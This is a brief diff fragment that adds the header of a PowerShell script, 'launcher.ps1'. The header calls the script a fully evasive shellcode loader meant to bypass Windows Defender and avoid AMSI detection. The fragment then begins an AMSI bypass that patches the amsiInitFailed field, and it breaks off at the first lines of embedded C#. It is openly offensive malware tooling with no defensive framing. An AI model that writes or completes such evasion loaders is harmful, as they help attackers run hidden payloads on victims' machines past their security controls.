@@ -1,3 +1,12 @@
+<#
+    launcher.ps1
+    Fully evasive shellcode loader – 2026 Defender bypass
+    No plaintext URLs, no AMSI detection, no disk write of payload.
+#>
+
+# ============================================================
+# 1. AMSI BYPASS (patch amsiInitFailed field – silent, no DLL unhooking)
+# ============================================================
 $amsiBypass = @'
 using System;
 using System.Runtime.InteropServices;
